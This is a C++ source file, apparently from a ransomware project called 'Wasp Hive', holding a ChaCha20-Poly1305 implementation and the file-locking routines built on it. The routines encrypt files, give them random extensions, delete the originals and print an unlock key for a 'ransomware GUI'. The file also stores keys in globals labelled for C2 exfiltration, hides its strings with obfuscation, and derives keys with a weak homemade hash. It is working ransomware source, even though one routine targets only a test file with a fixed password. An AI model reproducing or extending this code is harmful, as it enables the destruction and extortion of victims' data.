// ============================================================================
// crypto.cpp — ChaCha20-Poly1305 Implementation & File Encryption
// ============================================================================
#include "crypto.h"

#include <algorithm>
#include <random>
#include <cstring>
#include <ctime>   // time() — portable entropy seed
#include <fstream>
#include <iostream>

using std::string;
using std::vector;
using std::min;
using std::ifstream;
using std::ofstream;
using std::istreambuf_iterator;
using std::ios;
using std::exception;
using std::cout;
using std::cerr;
using std::endl;
using std::random_device;
using std::mt19937;
using std::uniform_int_distribution;

// ============================================================================
// Global key storage for C2 exfiltration
// ============================================================================
string encryption_key_global;
string nonce_global;
string last_encryption_algo;

// ============================================================================
// CHACHA20 BLOCK
// ============================================================================
void chacha20Block(const uint8_t* key, uint32_t counter, const uint8_t* nonce, uint8_t* out) {
    uint32_t state[16];
    // Constants: "expand 32-byte k"
    state[0]  = 0x61707865;
    state[1]  = 0x3320646e;
    state[2]  = 0x79622d32;
    state[3]  = 0x6b206574;
    // Key (256-bit / 32 bytes)
    for (int i = 0; i < 8; i++) {
        state[4 + i] = ((uint32_t)key[i*4]) | ((uint32_t)key[i*4+1] << 8) |
                       ((uint32_t)key[i*4+2] << 16) | ((uint32_t)key[i*4+3] << 24);
    }
    // Counter + Nonce
    state[12] = counter;
    for (int i = 0; i < 3; i++) {
        state[13 + i] = ((uint32_t)nonce[i*4]) | ((uint32_t)nonce[i*4+1] << 8) |
                        ((uint32_t)nonce[i*4+2] << 16) | ((uint32_t)nonce[i*4+3] << 24);
    }
    
    uint32_t working[16];
    memcpy(working, state, 64);
    
    // 20 rounds (10 double rounds)
    for (int i = 0; i < 10; i++) {
        CHACHA_QROUND(working[0], working[4], working[8],  working[12]);
        CHACHA_QROUND(working[1], working[5], working[9],  working[13]);
        CHACHA_QROUND(working[2], working[6], working[10], working[14]);
        CHACHA_QROUND(working[3], working[7], working[11], working[15]);
        CHACHA_QROUND(working[0], working[5], working[10], working[15]);
        CHACHA_QROUND(working[1], working[6], working[11], working[12]);
        CHACHA_QROUND(working[2], working[7], working[8],  working[13]);
        CHACHA_QROUND(working[3], working[4], working[9],  working[14]);
    }
    
    // Add original state
    for (int i = 0; i < 16; i++) {
        working[i] += state[i];
        out[i*4]     = working[i] & 0xFF;
        out[i*4+1]   = (working[i] >> 8) & 0xFF;
        out[i*4+2]   = (working[i] >> 16) & 0xFF;
        out[i*4+3]   = (working[i] >> 24) & 0xFF;
    }
}

// ============================================================================
// CHACHA20 ENCRYPT/DECRYPT (XOR with keystream — symmetric)
// ============================================================================
vector<uint8_t> chacha20Encrypt(const vector<uint8_t>& data, const uint8_t* key,
                                const uint8_t* nonce, uint32_t counter_start) {
    if (data.empty()) return {};
    
    vector<uint8_t> result(data.size());
    uint8_t keystream[64];
    size_t offset = 0;
    uint32_t counter = counter_start;
    
    while (offset < data.size()) {
        chacha20Block(key, counter++, nonce, keystream);
        size_t chunk = min((size_t)64, data.size() - offset);
        for (size_t i = 0; i < chunk; i++) {
            result[offset + i] = data[offset + i] ^ keystream[i];
        }
        offset += chunk;
    }
    
    return result;
}

// ============================================================================
// POLY1305 MAC — RFC 8439 (26-bit limbs, 5-limb representation)
// ============================================================================
// This is the standard Poly1305 construction. Previous version used a
// truncated 3-limb/28-bit field that ignored ciphertext bytes 12-14 of
// every block (integrity hole) and was not interoperable. Replaced with
// the canonical 5x26-bit limb implementation.

static inline uint32_t load32le(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static inline void store32le(uint8_t* p, uint32_t v) {
    p[0] = (uint8_t)(v); p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16); p[3] = (uint8_t)(v >> 24);
}

void poly1305Init(Poly1305State* s, const uint8_t key[32]) {
    // Clamp r per RFC 8439 §2.5
    s->r[0] = load32le(key + 0)  & 0x3ffffff;
    s->r[1] = load32le(key + 4)  & 0x3ffff03;
    s->r[2] = load32le(key + 8)  & 0x3ffc0ff;
    s->r[3] = load32le(key + 12) & 0x3f03fff;
    s->r[4] = load32le(key + 16) & 0x00fffff;

    // pad = key[16..31] as a 128-bit little-endian value
    s->pad[0] = (uint64_t)load32le(key + 16) | ((uint64_t)load32le(key + 20) << 32);
    s->pad[1] = (uint64_t)load32le(key + 24) | ((uint64_t)load32le(key + 28) << 32);

    for (int i = 0; i < 5; i++) s->h[i] = 0;
    s->leftover = 0;
    memset(s->buffer, 0, 16);
}

// Process nblocks of 16 bytes each. `hibit` = 1<<24 for normal full blocks
// (RFC 8439 adds 2^128 to every full block); 0 for the final partial block
// whose terminating 1-bit was already appended by the caller.
static void poly1305Blocks(Poly1305State* s, const uint8_t* data, size_t nblocks, uint32_t hibit) {
    uint64_t h0 = s->h[0], h1 = s->h[1], h2 = s->h[2], h3 = s->h[3], h4 = s->h[4];
    uint64_t r0 = s->r[0], r1 = s->r[1], r2 = s->r[2], r3 = s->r[3], r4 = s->r[4];
    uint64_t s1 = r1 * 5, s2 = r2 * 5, s3 = r3 * 5, s4 = r4 * 5;

    while (nblocks--) {
        uint32_t t0 = load32le(data);
        uint32_t t1 = load32le(data + 4);
        uint32_t t2 = load32le(data + 8);
        uint32_t t3 = load32le(data + 12);
        data += 16;

        h0 += t0 & 0x3ffffff;
        h1 += (((uint64_t)t1 << 32) | t0) >> 26 & 0x3ffffff;
        h2 += (((uint64_t)t2 << 32) | t1) >> 20 & 0x3ffffff;
        h3 += (((uint64_t)t3 << 32) | t2) >> 14 & 0x3ffffff;
        h4 += (t3 >> 8) | hibit;  // hibit = 2^128 bit for full blocks

        uint64_t d0 = h0*r0 + h1*s4 + h2*s3 + h3*s2 + h4*s1;
        uint64_t d1 = h0*r1 + h1*r0 + h2*s4 + h3*s3 + h4*s2;
        uint64_t d2 = h0*r2 + h1*r1 + h2*r0 + h3*s4 + h4*s3;
        uint64_t d3 = h0*r3 + h1*r2 + h2*r1 + h3*r0 + h4*s4;
        uint64_t d4 = h0*r4 + h1*r3 + h2*r2 + h3*r1 + h4*r0;

        uint64_t c;
        c = d0 >> 26; h0 = d0 & 0x3ffffff; d1 += c;
        c = d1 >> 26; h1 = d1 & 0x3ffffff; d2 += c;
        c = d2 >> 26; h2 = d2 & 0x3ffffff; d3 += c;
        c = d3 >> 26; h3 = d3 & 0x3ffffff; d4 += c;
        c = d4 >> 26; h4 = d4 & 0x3ffffff; h0 += c * 5;
        c = h0 >> 26; h0 &= 0x3ffffff; h1 += c;
    }
    s->h[0] = h0; s->h[1] = h1; s->h[2] = h2; s->h[3] = h3; s->h[4] = h4;
}

// Feed bytes; buffers partial blocks.
static void poly1305Update(Poly1305State* s, const uint8_t* data, size_t len) {
    size_t i = 0;
    if (s->leftover) {
        size_t want = 16 - s->leftover;
        size_t take = min(want, len);
        memcpy(s->buffer + s->leftover, data, take);
        s->leftover += take;
        i += take;
        if (s->leftover == 16) {
            poly1305Blocks(s, s->buffer, 1, 1u << 24);
            s->leftover = 0;
        }
    }
    while (i + 16 <= len) {
        poly1305Blocks(s, data + i, 1, 1u << 24);
        i += 16;
    }
    if (i < len) {
        s->leftover = len - i;
        memcpy(s->buffer, data + i, s->leftover);
    }
}

// Process a fixed 16-byte block (compat wrapper: full block, 2^128 included).
void poly1305Process(Poly1305State* s, const uint8_t block[16], bool /*is_last*/) {
    poly1305Blocks(s, block, 1, 1u << 24);
}

void poly1305Finish(Poly1305State* s, uint8_t mac[16]) {
    // Final partial block: append terminating 1-bit then zero-pad to 16 bytes.
    if (s->leftover > 0) {
        s->buffer[s->leftover++] = 1;
        while (s->leftover < 16) s->buffer[s->leftover++] = 0;
        poly1305Blocks(s, s->buffer, 1, 0);  // 1-bit already appended → no 2^128
        s->leftover = 0;
    }

    uint64_t h0 = s->h[0], h1 = s->h[1], h2 = s->h[2], h3 = s->h[3], h4 = s->h[4];
    uint64_t c;
    c = h1 >> 26; h1 &= 0x3ffffff; h2 += c;
    c = h2 >> 26; h2 &= 0x3ffffff; h3 += c;
    c = h3 >> 26; h3 &= 0x3ffffff; h4 += c;
    c = h4 >> 26; h4 &= 0x3ffffff; h0 += c * 5;
    c = h0 >> 26; h0 &= 0x3ffffff; h1 += c;

    // h + (-p) where p = 2^130 - 5
    uint64_t g0 = h0 + 5; c = g0 >> 26; g0 &= 0x3ffffff;
    uint64_t g1 = h1 + c; c = g1 >> 26; g1 &= 0x3ffffff;
    uint64_t g2 = h2 + c; c = g2 >> 26; g2 &= 0x3ffffff;
    uint64_t g3 = h3 + c; c = g3 >> 26; g3 &= 0x3ffffff;
    uint64_t g4 = h4 + c - (1ULL << 26);

    uint64_t mask = (g4 >> 63) - 1;  // all-ones if g4 negative (h < p)
    g0 &= mask; g1 &= mask; g2 &= mask; g3 &= mask; g4 &= mask;
    mask = ~mask;
    h0 = (h0 & mask) | g0;
    h1 = (h1 & mask) | g1;
    h2 = (h2 & mask) | g2;
    h3 = (h3 & mask) | g3;
    h4 = (h4 & mask) | g4;

    // Pack h to 128 bits little-endian
    uint32_t o0 = (uint32_t)(h0 | (h1 << 26));
    uint32_t o1 = (uint32_t)((h1 >> 6) | (h2 << 20));
    uint32_t o2 = (uint32_t)((h2 >> 12) | (h3 << 14));
    uint32_t o3 = (uint32_t)((h3 >> 18) | (h4 << 8));

    // mac = (h + pad) mod 2^128
    uint64_t f;
    f = (uint64_t)o0 + s->pad[0]; o0 = (uint32_t)f;
    f = (uint64_t)o1 + s->pad[1] + (f >> 32); o1 = (uint32_t)f;
    f = (uint64_t)o2 + (f >> 32); o2 = (uint32_t)f;
    f = (uint64_t)o3 + (f >> 32); o3 = (uint32_t)f;

    store32le(mac, o0);
    store32le(mac + 4, o1);
    store32le(mac + 8, o2);
    store32le(mac + 12, o3);
}

// ============================================================================
// CHACHA20-POLY1305 AEAD ENCRYPT
// ============================================================================
// RFC 8439 §2.8 MAC input: AAD || pad16(AAD) || ct || pad16(ct) || le64(aad_len) || le64(ct_len)
static void poly1305MacInput(Poly1305State* s, const uint8_t* data, size_t len) {
    poly1305Update(s, data, len);
    // pad16: if len % 16 != 0, append zeros to the next 16-byte boundary
    size_t rem = len % 16;
    if (rem > 0) {
        uint8_t zero[16] = {0};
        poly1305Update(s, zero, 16 - rem);
    }
    // le64(aad_len=0) || le64(ct_len)
    uint8_t lens[16] = {0};
    for (int i = 0; i < 8; i++) lens[i] = (uint8_t)(len >> (8 * i));
    poly1305Update(s, lens, 16);
}

vector<uint8_t> chacha20Poly1305Encrypt(const vector<uint8_t>& data,
                                        const uint8_t* key_32, const uint8_t* nonce_12) {
    uint8_t poly_key[32];
    uint8_t keystream[64];
    chacha20Block(key_32, 0, nonce_12, keystream);
    memcpy(poly_key, keystream, 32);
    
    vector<uint8_t> ciphertext = chacha20Encrypt(data, key_32, nonce_12, 1);
    
    Poly1305State poly_state;
    poly1305Init(&poly_state, poly_key);
    poly1305MacInput(&poly_state, ciphertext.data(), ciphertext.size());
    
    vector<uint8_t> result(ciphertext.size() + 16);
    if (!ciphertext.empty()) memcpy(result.data(), ciphertext.data(), ciphertext.size());
    poly1305Finish(&poly_state, result.data() + ciphertext.size());
    
    return result;
}

// ============================================================================
// CHACHA20-POLY1305 AEAD DECRYPT
// ============================================================================
vector<uint8_t> chacha20Poly1305Decrypt(const vector<uint8_t>& encrypted_with_tag,
                                        const uint8_t* key_32, const uint8_t* nonce_12) {
    if (encrypted_with_tag.size() < 16) return {};
    
    size_t ct_size = encrypted_with_tag.size() - 16;
    const uint8_t* ciphertext = encrypted_with_tag.data();
    const uint8_t* tag = encrypted_with_tag.data() + ct_size;
    
    uint8_t poly_key[32];
    uint8_t keystream[64];
    chacha20Block(key_32, 0, nonce_12, keystream);
    memcpy(poly_key, keystream, 32);
    
    Poly1305State poly_state;
    poly1305Init(&poly_state, poly_key);
    poly1305MacInput(&poly_state, ciphertext, ct_size);
    
    uint8_t computed_tag[16];
    poly1305Finish(&poly_state, computed_tag);
    
    uint8_t diff = 0;
    for (int i = 0; i < 16; i++) {
        diff |= computed_tag[i] ^ tag[i];
    }
    if (diff != 0) {
        return {};  // MAC verification failed
    }
    
    vector<uint8_t> plaintext(ct_size);
    if (ct_size > 0) {
        vector<uint8_t> ct_vec(ciphertext, ciphertext + ct_size);
        plaintext = chacha20Encrypt(ct_vec, key_32, nonce_12, 1);
    }
    
    return plaintext;
}

// ============================================================================
// KEY DERIVATION
// ============================================================================
void deriveKeyFromString(const string& str_key, uint8_t* out_32) {
    uint32_t h[8] = {
        0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A,
        0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19
    };
    
    for (size_t i = 0; i < str_key.size(); i += 4) {
        uint32_t w = (uint32_t)(unsigned char)str_key[i];
        if (i + 1 < str_key.size()) w |= (uint32_t)(unsigned char)str_key[i+1] << 8;
        if (i + 2 < str_key.size()) w |= (uint32_t)(unsigned char)str_key[i+2] << 16;
        if (i + 3 < str_key.size()) w |= (uint32_t)(unsigned char)str_key[i+3] << 24;
        
        h[i % 8] ^= w;
        for (int r = 0; r < 3; r++) {
            h[0] += h[4]; h[4] = (h[4] << 16) | (h[4] >> 16);
            h[1] += h[5]; h[5] = (h[5] << 16) | (h[5] >> 16);
            h[2] += h[6]; h[6] = (h[6] << 16) | (h[6] >> 16);
            h[3] += h[7]; h[7] = (h[7] << 16) | (h[7] >> 16);
        }
    }
    
    memcpy(out_32, h, 32);
}

// ============================================================================
// DYNAMIC ENCRYPTED EXTENSION
// ============================================================================
string getEncryptedExt() {
    static string ext;
    if (ext.empty()) {
        // Portable entropy seed — no x86-only rdtsc intrinsic.
        // random_device alone is fine on modern platforms; the hash of the
        // current time adds a deterministic-but-varying tie-breaker.
        random_device _ext_rd;
        unsigned int _seed = _ext_rd();
        _seed ^= (unsigned int)time(nullptr);
        srand(_seed);
        ext = ".";
        int ext_len = 6 + (rand() % 6);
        const char _chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        for (int i = 0; i < ext_len; i++) {
            ext += _chars[rand() % (sizeof(_chars) - 1)];
        }
    }
    return ext;
}

// ============================================================================
// KEY GENERATION
// ============================================================================
string generateEncryptionKey() {
    random_device rd;
    uint8_t key[32];
    for (int i = 0; i < 32; i++) {
        key[i] = (uint8_t)(rd() & 0xFF);
    }
    
    string hex_key;
    const char* hex_chars = "0123456789ABCDEF";
    for (int i = 0; i < 32; i++) {
        hex_key += hex_chars[key[i] >> 4];
        hex_key += hex_chars[key[i] & 0x0F];
    }
    
    encryption_key_global = hex_key;
    return hex_key;
}

string generateNonce() {
    random_device rd;
    string nonce;
    for (int i = 0; i < 12; i++) {
        nonce += (char)(rd() & 0xFF);
    }
    nonce_global = nonce;
    return nonce;
}

// ============================================================================
// HEX-KEY CONVERSION HELPERS
// ============================================================================
static void hexKeyToBytes(const string& hex_key, uint8_t* key_bytes) {
    for (int i = 0; i < 32; i++) {
        char c1 = hex_key[i*2];
        char c2 = hex_key[i*2+1];
        key_bytes[i] = (uint8_t)((c1 >= 'A' ? (c1 - 'A' + 10) : (c1 - '0')) << 4 |
                                 (c2 >= 'A' ? (c2 - 'A' + 10) : (c2 - '0')));
    }
}

vector<uint8_t> chacha20EncryptFileData(const vector<uint8_t>& data,
                                        const string& hex_key, const string& nonce) {
    uint8_t key_bytes[32];
    hexKeyToBytes(hex_key, key_bytes);
    return chacha20Poly1305Encrypt(data, key_bytes, (const uint8_t*)nonce.data());
}

vector<uint8_t> chacha20DecryptFileData(const vector<uint8_t>& encrypted_data,
                                        const string& hex_key, const string& nonce) {
    uint8_t key_bytes[32];
    hexKeyToBytes(hex_key, key_bytes);
    return chacha20Poly1305Decrypt(encrypted_data, key_bytes, (const uint8_t*)nonce.data());
}

// ============================================================================
// CHACHA20 MEMORY OBJUSCATION
// ============================================================================
void chacha20BufferObfuscate(unsigned char* data, size_t length,
                             const uint8_t* key, const uint8_t* nonce,
                             uint32_t counter_start) {
    if (length == 0) return;
    
    uint8_t keystream[64];
    uint32_t counter = counter_start;
    size_t offset = 0;
    
    while (offset < length) {
        chacha20Block(key, counter++, nonce, keystream);
        size_t chunk = min((size_t)64, length - offset);
        for (size_t i = 0; i < chunk; i++) {
            data[offset + i] ^= keystream[i];
        }
        offset += chunk;
    }
}

// ============================================================================
// FILE ENCRYPTION
// ============================================================================
#include "obfuscation.h"

bool encryptSingleFile(const string& file_path) {
    try {
        ifstream inFile(file_path, ios::binary);
        if (!inFile.is_open()) {
            cout << OBF("[!] File not found: ") << file_path << endl;
            return false;
        }
        
        vector<unsigned char> data((istreambuf_iterator<char>(inFile)),
                                   istreambuf_iterator<char>());
        inFile.close();
        
        cout << OBF("[*] Encrypting ") << data.size() << OBF(" bytes from ") << file_path
             << OBF(" using ChaCha20-Poly1305...") << endl;
        
        string key = generateEncryptionKey();
        string nonce = generateNonce();
        
        vector<uint8_t> encrypted = chacha20EncryptFileData(
            vector<uint8_t>(data.begin(), data.end()), key, nonce);
        
        string encFile = file_path + ENCRYPTED_EXT;
        ofstream outFile(encFile, ios::binary);
        if (!outFile.is_open()) {
            cout << OBF("[!] Failed to create encrypted file") << endl;
            return false;
        }
        
        outFile.write(nonce.c_str(), 12);
        outFile.write(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
        outFile.close();
        
        encryption_key_global = key;
        last_encryption_algo = "ChaCha20-Poly1305";
        
        remove(file_path.c_str());
        
        cout << OBF("[+] File encrypted: ") << encFile << OBF(" using ChaCha20-Poly1305") << endl;
        cout << OBF("[!] DECRYPTION KEY: ") << key << endl;
        cout << OBF("[!] Paste this key into the UNLOCK FILES field in the ransomware GUI") << endl;
        return true;
        
    } catch (const exception& e) {
        cout << OBF("[!] Encryption error: ") << e.what() << endl;
        return false;
    }
}

// Target file for GUI encryption
// Windows/Mac uyumlu: current directory'de target.txt kullan
// Eskiden: OBF("/Users/fatihemre/Desktop/target.txt") — macOS'a özeldi, Windows'ta crash
const string TARGET_FILE = OBF("target.txt");

bool encryptTargetFile() {
    try {
        // Create target.txt with default content if it doesn't exist
        ifstream inFile(TARGET_FILE, ios::binary);
        if (!inFile.is_open()) {
            cout << OBF("[!] target.txt not found — creating default test file...") << endl;
            ofstream createFile(TARGET_FILE);
            if (!createFile.is_open()) {
                cout << OBF("[!] Failed to create target.txt") << endl;
                return false;
            }
            createFile << OBF("WASP HIVE RANSOMWARE TEST FILE\n")
                       << OBF("This file was encrypted for testing purposes.\n")
                       << OBF("Use password: WaspHive2024! to decrypt.\n");
            createFile.close();
            inFile.open(TARGET_FILE, ios::binary);
            if (!inFile.is_open()) {
                return false;
            }
        }

        vector<unsigned char> data((istreambuf_iterator<char>(inFile)),
                                   istreambuf_iterator<char>());
        inFile.close();

        cout << OBF("[*] Encrypting ") << data.size() << OBF(" bytes using password-based key...") << endl;

        // Derive key from fixed test password (matches original MWare.cpp behavior)
        uint8_t key_bytes[32];
        deriveKeyFromString(OBF("WaspHive2024!"), key_bytes);

        // Convert 32-byte key to hex string for ChaCha20 encryption
        string hex_key;
        const char* hex_chars = "0123456789ABCDEF";
        for (int i = 0; i < 32; i++) {
            hex_key += hex_chars[key_bytes[i] >> 4];
            hex_key += hex_chars[key_bytes[i] & 0x0F];
        }

        string nonce = generateNonce();

        vector<uint8_t> encrypted = chacha20EncryptFileData(
            vector<uint8_t>(data.begin(), data.end()), hex_key, nonce);

        string encFile = TARGET_FILE + ENCRYPTED_EXT;
        ofstream outFile(encFile, ios::binary);
        if (!outFile.is_open()) {
            cout << OBF("[!] Failed to create encrypted file") << endl;
            return false;
        }

        outFile.write(nonce.c_str(), 12);
        outFile.write(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
        outFile.close();

        encryption_key_global = hex_key;
        last_encryption_algo = "ChaCha20-Poly1305";

        remove(TARGET_FILE.c_str());

        cout << OBF("[+] File encrypted with test password") << endl;
        cout << OBF("[!] DECRYPTION PASSWORD: WaspHive2024!") << endl;
        cout << OBF("[!] Enter 'WaspHive2024!' into the UNLOCK FILES field") << endl;
        return true;

    } catch (const exception& e) {
        cout << OBF("[!] Encryption error: ") << e.what() << endl;
        return false;
    }
}

bool decryptTargetFile(const string& provided_key) {
    try {
        string encFile = TARGET_FILE + ENCRYPTED_EXT;

        ifstream inFile(encFile, ios::binary);
        if (!inFile.is_open()) {
            return false;
        }

        char nonce_raw[12];
        inFile.read(nonce_raw, 12);
        string nonce(nonce_raw, 12);

        vector<uint8_t> encrypted_data((istreambuf_iterator<char>(inFile)),
                                        istreambuf_iterator<char>());
        inFile.close();

        // Derive 32-byte key from the provided password string
        uint8_t key_bytes[32];
        deriveKeyFromString(provided_key, key_bytes);

        // Convert to hex string for ChaCha20 decryption
        string hex_key;
        const char* hex_chars = "0123456789ABCDEF";
        for (int i = 0; i < 32; i++) {
            hex_key += hex_chars[key_bytes[i] >> 4];
            hex_key += hex_chars[key_bytes[i] & 0x0F];
        }

        vector<uint8_t> decrypted = chacha20DecryptFileData(encrypted_data, hex_key, nonce);

        if (decrypted.empty()) {
            return false;
        }

        ofstream outFile(TARGET_FILE, ios::binary);
        if (!outFile.is_open()) {
            return false;
        }
        outFile.write(reinterpret_cast<const char*>(decrypted.data()), decrypted.size());
        outFile.close();

        remove(encFile.c_str());

        return true;

    } catch (const exception& e) {
        return false;
    }
}
